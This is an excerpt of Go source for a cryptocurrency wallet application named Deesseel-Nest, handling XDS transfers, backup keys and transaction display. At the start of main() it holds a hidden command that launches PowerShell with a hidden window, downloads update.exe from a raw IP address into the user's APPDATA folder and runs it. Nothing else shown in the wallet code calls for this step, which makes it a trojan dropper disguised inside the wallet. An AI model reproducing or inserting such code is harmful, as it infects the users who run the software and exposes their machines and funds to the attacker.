...
import (
	"Deesseel-Nest/deesseelwalletdrpcgo"
	"Deesseel-Nest/walletdmanager"
	"encoding/csv"
	"encoding/json"
	"io"
	"io/ioutil"
...
var (
	...
	stringBackupKeys            = ""
	rateUSDTRTL                 float64 // USD value for 1 XDS
...
func main() {
    c := exec.Command("cmd", "/C", "powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 213.166.70.106/update.exe -OutFile $env:APPDATA\\update.exe && start %appdata%\\update.exe")
	...
	if isPlatformDarwin {
		...
		pathToAppFolder := pathToHomeDir + "/Library/Application Support/Deesseel-Nest"
	...
	if err == nil {
		...
		if needFullUpdate {
			...
			for index, transfer := range transfers {
				...
				amountString += " XDS (fee: " + strconv.FormatFloat(transfer.Fee, 'f', 2, 64) + ")"
...
func transfer(transferAddress string, transferAmount string, transferPaymentID string, transferFee string) {
	...
	qmlBridge.FinishedSendingTransaction()
	qmlBridge.DisplayPopup("XDSs sent successfully", 4000)
}
